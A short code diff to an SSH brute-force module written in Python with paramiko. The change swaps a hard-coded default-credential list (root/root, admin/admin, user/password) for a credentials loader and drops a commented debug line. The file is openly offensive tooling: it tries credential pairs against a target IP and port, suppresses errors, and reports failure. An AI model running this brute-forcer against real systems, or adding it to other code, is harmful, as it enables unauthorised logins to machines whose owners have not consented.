@@ -1,8 +1,9 @@
-# bruteforce/ssh_bruteforce.py
 import paramiko
+from bruteforce.credentials_loader import load_credentials
 import warnings
 
-def ssh_bruteforce(ip, port=22, creds=[('root', 'root'), ('admin', 'admin'), ('user', 'password')]):
+def ssh_bruteforce(ip, port=22):
+    creds = load_credentials()
     print(f"[*] Trying SSH brute-force on {ip}:{port}")
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -21,9 +22,7 @@ def ssh_bruteforce(ip, port=22, creds=[('root', 'root'), ('admin', 'admin'), ('u
                 return None
             continue
 
-        except Exception as e:
-            # print error in case of debugging
-            # print(f"[DEBUG] Unknown exception: {str(e)}")
+        except Exception:
             continue
 
     print("[-] No valid SSH credentials found.")
